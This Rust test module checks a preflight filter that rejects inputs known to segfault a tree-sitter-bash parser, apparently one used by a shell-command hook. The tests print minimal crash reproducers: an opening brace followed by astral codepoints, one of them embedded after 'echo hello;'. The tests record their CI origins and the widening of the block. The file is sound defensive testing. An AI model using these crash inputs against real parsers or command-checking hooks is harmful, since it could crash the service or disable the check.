        // 2486-2489 of the originally captured 2863-byte crasher.
        let input = "{\u{31840}";
        assert_eq!(input.as_bytes(), b"{\xF0\xB1\xA1\x80");
        assert_eq!(preflight_known_crashers(input), Err(ParseError::Malformed));
    }

    #[test]
    fn preflight_denies_openbrace_plus_u31860() {
        // U+31860 = F0 B1 A1 A0. Classifier-sweep probe CI showed
        // this shape also SIGSEGVs — hence the widened preflight
        // that matches the whole F0 B1 A1 ?? row (U+31840..U+3187F).
        let input = "{\u{31860}";
        assert_eq!(input.as_bytes(), b"{\xF0\xB1\xA1\xA0");
        assert_eq!(preflight_known_crashers(input), Err(ParseError::Malformed));
    }

    #[test]
    fn preflight_denies_openbrace_plus_u31860_embedded() {
        // Scan must find the shape anywhere in the input, not
        // only at position 0.
        let input = "echo hello; {\u{31860} bar";
        assert_eq!(preflight_known_crashers(input), Err(ParseError::Malformed));
    }

    #[test]
    fn preflight_denies_entire_u31840_row() {
        // Spot-check several codepoints across the full row to
        // confirm the 3-byte-prefix match covers every codepoint
        // in U+31840..U+3187F.
        for cp in ['\u{31840}', '\u{31850}', '\u{31860}', '\u{3187F}'] {
            let input = format!("{{{cp}");
            assert_eq!(
                preflight_known_crashers(&input),
                Err(ParseError::Malformed),
                "preflight missed `{{` + U+{:X}",
                cp as u32
            );
        }
    }

    #[test]
    fn preflight_denies_openbrace_plus_u31bc3() {
        // 1.3.3 lane: second Linux tree-sitter-bash SIGSEGV, pinned
        // by CI run 25284064905. `{` + U+31BC3 (CJK Ext H) is the
        // 5-byte minimal reproducer.
        let input = "{\u{31BC3}";
        assert_eq!(preflight_known_crashers(input), Err(ParseError::Malformed));
    }

    #[test]
    fn preflight_denies_entire_u31bc0_row() {
        // Same structural shape as the Ext G row: the crash lives in
        // the shared `F0 B1 AF` prefix, not in a single codepoint.
        // Spot-check the row endpoints + the known reproducer.
        for cp in ['\u{31BC0}', '\u{31BC3}', '\u{31BD0}', '\u{31BFF}'] {
            let input = format!("{{{cp}");
            assert_eq!(
                preflight_known_crashers(&input),
                Err(ParseError::Malformed),
                "preflight missed `{{` + U+{:X}",
                cp as u32
            );
        }
    }

    #[test]
    fn preflight_denies_openbrace_plus_u316ff() {
        // 1.3.6 lane: fifth Linux tree-sitter-bash SIGSEGV class,
        // surfaced by `pre_bash_hook_exit_contract_holds_for_valid_json`
        // on PR #47 CI. `{` + U+316FF (CJK Ext G sub-row 2) is the
        // 5-byte minimal reproducer (extracted from the proptest
        // shrink output; full capture in `tests/data/linux_crash_05.bin`).
        let input = "{\u{316FF}";
        assert_eq!(preflight_known_crashers(input), Err(ParseError::Malformed));
    }

    #[test]
    fn preflight_denies_entire_u316c0_row() {
        // Row U+316C0..U+316FF shares prefix `F0 B1 9B`.
        for cp in ['\u{316C0}', '\u{316E0}', '\u{316FF}'] {
            let input = format!("{{{cp}");
            assert_eq!(
                preflight_known_crashers(&input),
                Err(ParseError::Malformed),
                "preflight missed `{{` + U+{:X}",
                cp as u32
            );
        }
    }

    #[test]
    fn preflight_denies_openbrace_plus_u31f88() {
        // 1.3.4 lane: third Linux tree-sitter-bash SIGSEGV class,
        // pinned by CI run 25299266828. `{` + U+31F88 is the
        // 5-byte minimal reproducer (bisected from the 642-byte
        // `linux_crash_03.bin` capture).
        let input = "{\u{31F88}";
        assert_eq!(preflight_known_crashers(input), Err(ParseError::Malformed));
    }

    #[test]
    fn preflight_denies_entire_u31f80_row() {
        // Same prefix-row shape: U+31F80..U+31FBF share `F0 B1 BE`.
        for cp in ['\u{31F80}', '\u{31F88}', '\u{31FA0}', '\u{31FBF}'] {
            let input = format!("{{{cp}");
            assert_eq!(
                preflight_known_crashers(&input),
                Err(ParseError::Malformed),
                "preflight missed `{{` + U+{:X}",
                cp as u32
            );
        }
    }

    #[test]
    fn preflight_denies_openbrace_plus_u30225() {
        // 1.3.8 lane: sixth Linux tree-sitter-bash SIGSEGV class,
        // surfaced by the best-effort `linux-fuzz-repro` job on PR #49
        // CI (1.3.7 audit-fix PR, 8192-case proptest sweep). `{` +
        // U+30225 (CJK Ext G row U+30200..U+3023F) is the 5-byte
        // minimal reproducer extracted from the 995-byte proptest
        // input (see `tests/data/linux_crash_06.bin`). The PR #50
        // bisect confirmed the whole `F0 B0` lead pair crashes,
        // widening the mitigation to a 2-byte block-level deny.
        let input = "{\u{30225}";
        assert_eq!(preflight_known_crashers(input), Err(ParseError::Malformed));
    }

    #[test]
    fn preflight_denies_entire_f0_b0_block() {
        // 1.3.8 PR #50 bisect: the whole `F0 B0` lead pair crashes
        // (U+30000..U+33FFF, the lower swath of CJK Ext G/H). Probe
        // codepoints drawn from rows spanning the block boundary, not
        // all in one row.
        for cp in [
            '\u{30000}', // Ext G start
            '\u{30100}', // row above crash06
            '\u{301FF}', // just below crash06 row
            '\u{30200}', // crash06 row start
            '\u{30225}', // crash06 minimal
            '\u{3023F}', // crash06 row end
            '\u{30240}', // just above crash06 row
            '\u{30300}', // row well above
            '\u{30FFF}', // `F0 B0` lead-pair end
        ] {
            let input = format!("{{{cp}");
            assert_eq!(
                preflight_known_crashers(&input),
                Err(ParseError::Malformed),
                "preflight missed `{{` + U+{:X}",
                cp as u32
            );
        }
    }

    /// 1.3.8 final widening (class 8): the preflight now denies `{` +
    /// ANY 4-byte UTF-8 codepoint, so the former "allows other astral
    /// codepoints" negative control no longer applies. This test
    /// replaces it by confirming the preflight allows `{` + BMP
    /// (1, 2, 3-byte UTF-8) codepoints — only the 4-byte lead-byte
    /// range is dangerous.
    #[test]
    fn preflight_allows_openbrace_plus_bmp_codepoints() {
        for cp in [
            '\u{41}',   // ASCII `A` (1 byte)
            '\u{E9}',   // Latin small letter e with acute (2 bytes)
            '\u{6F22}', // CJK ideograph 漢 (3 bytes)
            '\u{FFFD}', // BMP replacement character (3 bytes)
        ] {
            let input = format!("{{{cp}");
            assert_eq!(
                preflight_known_crashers(&input),
                Ok(()),
                "preflight over-matched on `{{` + U+{:X}",
                cp as u32
            );
        }
    }

    /// 1.3.8 final widening: `{` + ANY astral (4-byte UTF-8) codepoint
    /// now denies. Probe across the whole astral range — pre-1.3.8
    /// passes (e.g. U+10000, U+1F600, U+20000, U+2FFFF) are now
    /// expected to deny.
    #[test]
    fn preflight_denies_openbrace_plus_any_astral() {
        for cp in [
            '\u{10000}',  // F0 90 80 80 — plane 1, start
            '\u{1F600}',  // F0 9F 98 80 — emoji
            '\u{20000}',  // F0 A0 80 80 — CJK Ext B
            '\u{2FFFF}',  // F0 AF BF BF — last plane-2 codepoint below Ext G
            '\u{E0144}',  // F3 A0 85 84 — tag-space (class-8 witness)
            '\u{10FFFF}', // F4 8F BF BF — last valid Unicode codepoint
        ] {
            let input = format!("{{{cp}");
            assert_eq!(
                preflight_known_crashers(&input),
                Err(ParseError::Malformed),
                "preflight missed `{{` + U+{:X}",
                cp as u32
            );
        }
    }

    #[test]
    fn preflight_allows_crasher_row_not_preceded_by_openbrace() {
        // Codepoints from the crashing row are fine without the
        // `{` prefix — bisect confirmed the adjacency requirement.
        for input in ["\u{31860}", " \u{31860}", "a\u{31860}", "(\u{31860}"] {
            assert_eq!(
                preflight_known_crashers(input),
                Ok(()),
                "preflight over-matched on {input:?}"
            );
        }
    }

    #[test]
    fn preflight_allows_short_inputs_without_scanning() {
        // Scan requires 5 bytes minimum; shorter inputs early-
        // return Ok without looking at any bytes (defensive).
        assert_eq!(preflight_known_crashers(""), Ok(()));
        assert_eq!(preflight_known_crashers("{"), Ok(()));
        assert_eq!(preflight_known_crashers("{a"), Ok(()));
        // 5 bytes, not the crasher:
        assert_eq!(preflight_known_crashers("hello"), Ok(()));
    }

    #[test]
    fn preflight_allows_openbrace_plus_crasher_non_adjacent() {
        // Even ONE byte between `{` and the crasher must allow —
        // the bisect confirmed adjacency is required.
        let input = "{ \u{31860}";
        assert_eq!(preflight_known_crashers(input), Ok(()));
    }
}
